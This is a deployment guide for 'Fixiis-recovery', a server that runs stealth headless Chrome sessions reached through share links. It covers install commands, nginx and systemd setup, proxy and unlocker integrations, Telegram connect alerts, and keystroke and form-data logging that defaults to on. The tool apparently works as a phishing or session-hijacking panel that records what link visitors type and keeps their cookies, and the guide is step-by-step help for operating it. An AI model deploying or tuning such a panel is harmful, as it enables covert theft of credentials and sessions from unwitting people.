# Deploying to a VPS

How to get this running on your own server. Everything here was checked
against the actual code — `main.py`, `config.py` and `api.py` — rather than
guesswork.

**Read [First: rotate your credentials](#first-rotate-your-credentials)
before you deploy.** The credentials baked into `config.py` are public.

---

## What you need

| | Minimum | Comfortable |
|---|---|---|
| CPU | 2 vCPU | 4 vCPU |
| RAM | 4 GB | 8 GB+ |
| Disk | 40 GB SSD | 80 GB SSD |
| OS | Ubuntu 22.04 | Ubuntu 24.04 |

RAM is the real constraint, not CPU. Each live session is a Chrome instance
— budget roughly **300–500 MB per concurrent session**. `MAX_SESSIONS` in
your env decides how many the box will accept; set it to something your RAM
actually supports, not something optimistic.

Open ports: **22** (SSH), **80** and **443**. Port 8446 should stay closed
to the internet — nginx fronts it.

---

## Quick start

Fresh Ubuntu box, as root:

```bash
curl -fsSL https://raw.githubusercontent.com/freemancatalogue979-web/v2/arena/e2dc03bd-v2/Fixiis-recovery/deploy/setup.sh \
  | sudo bash -s -- --domain panel.example.com --email you@example.com
```

That installs Chrome, Python deps, Playwright browsers, systemd, nginx and a
Let's Encrypt certificate. It prints a generated admin password **once** and
saves it to `/root/fixiis-credentials.txt`.

Prerequisite: `panel.example.com` must already resolve to the server's IP, or
the certificate step fails.

---

## Manual installation

Use this if you want to understand each step, or you're not on Ubuntu.

### 1. System packages

```bash
sudo apt update
sudo apt install -y python3 python3-venv python3-dev build-essential \
  git curl wget unzip nginx certbot python3-certbot-nginx ufw \
  libnss3 libnspr4 libatk1.0-0 libatk-bridge2.0-0 libcups2 libdrm2 \
  libxkbcommon0 libxcomposite1 libxdamage1 libxfixes3 libxrandr2 \
  libgbm1 libpango-1.0-0 libcairo2 libasound2 libatspi2.0-0 \
  fonts-liberation xvfb

# Google Chrome (the SeleniumBase backend drives real Chrome)
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo apt install -y ./google-chrome-stable_current_amd64.deb
```

### 2. Application

```bash
sudo useradd --system --home-dir /opt/fixiis --shell /usr/sbin/nologin fixiis
sudo git clone -b arena/e2dc03bd-v2 https://github.com/freemancatalogue979-web/v2.git /opt/src
sudo cp -a /opt/src/Fixiis-recovery /opt/fixiis

cd /opt/fixiis
sudo python3 -m venv venv
sudo venv/bin/pip install --upgrade pip
sudo venv/bin/pip install -r requirements.txt
sudo venv/bin/playwright install chromium
```

### 3. Configure

```bash
sudo cp .env.example .env
sudo chmod 600 .env
```

Generate an admin password hash and put it in `.env`:

```bash
/opt/fixiis/venv/bin/python -c \
  "import bcrypt;print(bcrypt.hashpw(b'YOUR_PASSWORD', bcrypt.gensalt(12)).decode())"
```

Then edit `.env` and set at minimum:

```
ADMIN_PASSWORD_HASH=<the hash you just generated>
PUBLIC_IP=<your server's public IP>
SERVER_DOMAIN=panel.example.com
USE_HTTPS=true
```

`main.py` loads `.env` automatically at startup, before `config.py` is
imported — so anything in `.env` overrides the defaults in `config.py`.
No extra tooling needed.

### 4. Run it under systemd

```bash
sudo sed 's|/opt/fixiis|/opt/fixiis|g' deploy/fixiis.service \
  | sudo tee /etc/systemd/system/fixiis.service
sudo systemctl daemon-reload
sudo systemctl enable --now fixiis
sudo journalctl -u fixiis -f        # watch it come up
```

### 5. nginx + HTTPS

```bash
sudo sed 's|panel\.example\.com|panel.example.com|g' deploy/nginx.conf \
  | sudo tee /etc/nginx/sites-available/fixiis
sudo ln -s /etc/nginx/sites-available/fixiis /etc/nginx/sites-enabled/
sudo rm -f /etc/nginx/sites-enabled/default
sudo nginx -t && sudo systemctl reload nginx

sudo certbot --nginx -d panel.example.com --agree-tos -m you@example.com
```

Two nginx settings are non-obvious and easy to miss:

- **WebSocket upgrade headers.** The live view, the admin event feed and
  chat all ride on WebSockets. Without `Upgrade` / `Connection` they
  connect and then sit there doing nothing.
- **`proxy_read_timeout`.** nginx defaults to 60 s, which silently kills
  long-lived streaming sockets. The provided config raises it to an hour.

### 6. Firewall

```bash
sudo ufw allow OpenSSH
sudo ufw allow 'Nginx Full'
sudo ufw enable
```

Leave 8446 closed.

---

## First: rotate your credentials

`config.py` ships with working credentials hardcoded, and this repository is
public. If you deploy without changing them, you are running a server whose
secrets anyone can read off GitHub.

Rotate these **first**, then put the new values in `.env`:

| Secret | Where it lives | How to rotate |
|---|---|---|
| Telegram bot token | `config.py` → `telegram_bot_token` | `@BotFather` → `/revoke`, then new token |
| Telegram admin password | `telegram_admin_password` | Change it — the shipped default is a guessable word |
| Proxy account | `proxy_username` / `proxy_password` | Change at your proxy provider |
| Oxylabs browser | `oxylabs_browser_username` / `_password` | Change in the Oxylabs dashboard |
| Oxylabs unlocker | `oxylabs_unlocker_username` / `_password` | Same |
| Panel login | `ADMIN_USERNAME` + `ADMIN_PASSWORD_HASH` | Generate a new bcrypt hash |

Setting them in `.env` overrides the hardcoded values without editing
`config.py` — which also means the next `git pull` won't clobber them.

Also worth deciding: `KEYLOG_ENABLED` and `KEYLOG_LOG_FORM_DATA` both
default to **true**. If you don't need keystroke capture, turn it off.

---

## Configuration reference

Set these in `/opt/fixiis/.env`. `config.py` reads them at startup.

### Required

| Variable | Purpose |
|---|---|
| `ADMIN_USERNAME` | Panel login. Default `admin`. |
| `ADMIN_PASSWORD_HASH` | bcrypt hash of the panel password. **Change this.** |
| `PUBLIC_IP` | Public IP used to build share links. |
| `SERVER_DOMAIN` | Your domain, same purpose. |
| `USE_HTTPS` | `true` once TLS is up. |

### Network

| Variable | Default | Notes |
|---|---|---|
| `HOST` | `0.0.0.0` | Set to `127.0.0.1` when nginx fronts it. |
| `PORT` | `8446` | Internal port. |
| `ALLOWED_ORIGINS` | `*` | Set this when the panels are hosted elsewhere. |

### Browser

| Variable | Default | Notes |
|---|---|---|
| `BROWSER_BACKEND` | `sb` | `sb` = SeleniumBase real-Chrome stealth. `playwright` = fallback. |
| `HEADLESS` | `true` | |
| `STEALTH_MODE` | `true` | |
| `USE_SYSTEM_CHROME` | `true` | Uses the installed Chrome. |
| `CHROME_PATH` | auto | Only if auto-detection fails. |
| `BROWSER_POOL_SIZE` | `10` | |
| `MAX_SESSIONS` | `20` | Keep within your RAM budget. |

### Integrations

`TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`, `TELEGRAM_ADMIN_IDS`,
`TELEGRAM_ENABLED`, `TELEGRAM_NOTIFY_ON_CONNECT`,
`PROXY_ENABLED`, `PROXY_SERVER`, `PROXY_USERNAME`, `PROXY_PASSWORD`,
`KEYLOG_ENABLED`, `KEYLOG_LOG_FORM_DATA`, `ENABLE_LIVE_LIBRARY`.

### Tuning

`TARGET_FPS`, `QUALITY`, `BITRATE`, `USE_GPU`, `DEBUG_MODE`,
`ENABLE_METRICS`, `SESSION_TIMEOUT`.

---

## Hosting the panels separately

You don't have to serve the admin panels from the backend. All three
front-ends resolve their backend in this order:

1. `?server=https://your-backend` (also `?backend=` / `?api=`)
2. `window.SERVER_ENDPOINT`, set before the page's script runs
3. The value remembered in `localStorage` under `lpv_server_endpoint`
4. The origin serving the page — **skipped for `file://`**, whose opaque
   `null` origin can never be a backend

The storage key is shared by `Admin.html`, `mini-admin.html` and
`client.html`, so hosting all three on one static domain means configuring
the backend once.

To do this:

1. Upload the HTML file to Netlify / Cloudflare Pages / S3 / anything.
2. Set `ALLOWED_ORIGINS` on the backend to include that origin:
   ```
   ALLOWED_ORIGINS=https://ops.netlify.app
   ```
3. Open the panel with `?server=https://panel.example.com`, or inject
   `window.SERVER_ENDPOINT` into the page.

**Use `https://` for the backend if the panel is on HTTPS.** Browsers block
`ws://` from an HTTPS page as mixed content, and the live feed will not
connect.

---

## Where data lives

Created automatically at startup (`config.py`):

| Path | Contents |
|---|---|
| `profiles/` | Per-session browser profiles — cookies, history, fingerprints |
| `logs/` | Application and proxy logs |
| `cache/` | Temporary capture data |
| `lpv/` | Live page state, plus `lpv/pages/` for saved pages |
| `data/` | Telegram config and server settings |

All of these are in `.gitignore`, so they stay out of git. Back up
`data/` and `lpv/pages/` — that's your configuration and saved work.
`profiles/` and `cache/` are disposable.

---

## Operations

```bash
systemctl status fixiis          # is it up
journalctl -u fixiis -f          # live logs
systemctl restart fixiis         # restart after .env changes
journalctl -u fixiis --since '1 hour ago'   # recent history

certbot renew --dry-run          # verify auto-renewal works
systemctl status certbot.timer   # renewal is scheduled
```

Updating:

```bash
cd /opt/fixiis && sudo git pull
sudo venv/bin/pip install -r requirements.txt
sudo systemctl restart fixiis
```

Note: `git pull` will overwrite `config.py`. Anything you set in `.env`
survives; anything you edited directly in `config.py` does not.

---

## Troubleshooting

**Service starts then dies immediately.**
`journalctl -u fixiis -n 50`. Most often a missing Chrome or a bad
`.env` line.

**Login page loads but sign-in fails.**
`ADMIN_PASSWORD_HASH` must be a *bcrypt* hash, not the password itself.
Regenerate it.

**Panel loads, but clients never appear.**
The WebSocket isn't reaching the app. Check that nginx passes the
`Upgrade` and `Connection` headers, and that `proxy_read_timeout` is raised.
Confirm the app itself is healthy with:
`curl -s http://127.0.0.1:8446/api/settings`

**Live view connects but shows a black frame.**
Chrome couldn't start, or it needs more shared memory. Add to the unit:
```
[Service]
ExecStartPre=/bin/mount -o remount,size=2G /dev/shm
```

**Sessions die under load.**
You're out of RAM. Lower `MAX_SESSIONS` and `BROWSER_POOL_SIZE`, or add
swap:
```bash
sudo fallocate -l 4G /swapfile && sudo chmod 600 /swapfile
sudo mkswap /swapfile && sudo swapon /swapfile
echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab
```

**Share links point at the wrong address.**
Set `PUBLIC_IP` and `SERVER_DOMAIN`. The shipped default in `config.py` is a
hardcoded IP from a previous host.

**Panels hosted elsewhere can't reach the backend.**
Set `ALLOWED_ORIGINS`, and make sure both sides are HTTPS.
